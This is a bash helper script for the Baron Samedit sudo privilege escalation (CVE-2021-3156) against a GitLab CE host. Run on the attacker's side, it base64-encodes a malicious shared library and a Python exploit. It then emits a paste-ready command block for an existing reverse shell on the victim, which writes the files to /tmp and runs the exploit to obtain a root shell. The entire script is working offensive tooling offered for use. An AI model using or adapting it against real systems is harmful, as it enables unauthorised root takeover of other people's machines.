#!/bin/bash
# Baron Samedit (CVE-2021-3156) privilege escalation — transfer + run helper
#
# Run this ON THE ATTACKER. It emits a single multi-line block of commands
# that you paste into an existing reverse shell on the victim (running as
# a non-root user like git). The block drops the pre-built payload .so
# and the Python exploit into /tmp and runs the exploit.
#
# Why pre-built: the victim (GitLab CE) has no gcc. We compile payload_lib.so
# on the attacker (where gcc is available) and base64-transfer the binary.

set -e

EXPLOIT_DIR="/opt/exploits/baron-samedit"
LIB_SRC="$EXPLOIT_DIR/payload_lib.so"
PY_SRC="$EXPLOIT_DIR/exploit_nss.py"
REMOTE_LIB="/tmp/libnss_X/P0P_SH3LL.so.2"
REMOTE_PY="/tmp/exploit_nss.py"

if [ ! -f "$LIB_SRC" ]; then
    echo "[!] Missing $LIB_SRC — build it first:"
    echo "    cd $EXPLOIT_DIR && gcc -shared -fPIC -nostartfiles -o payload_lib.so payload_lib.c"
    exit 1
fi
if [ ! -f "$PY_SRC" ]; then
    echo "[!] Missing $PY_SRC"
    exit 1
fi

LIB_B64=$(base64 -w0 "$LIB_SRC")
PY_B64=$(base64 -w0 "$PY_SRC")

cat <<EOF

════════════════════════════════════════════════════════════════════
 Baron Samedit (CVE-2021-3156) — Paste this block into the victim shell
════════════════════════════════════════════════════════════════════

mkdir -p "\$(dirname ${REMOTE_LIB})"
echo '${LIB_B64}' | base64 -d > ${REMOTE_LIB}
echo '${PY_B64}' | base64 -d > ${REMOTE_PY}
chmod +x ${REMOTE_PY}
python3 ${REMOTE_PY}

════════════════════════════════════════════════════════════════════

If the exploit works, the shell will print "[+] ROOT shell obtained!"
and drop you into a bash prompt as root.

EOF
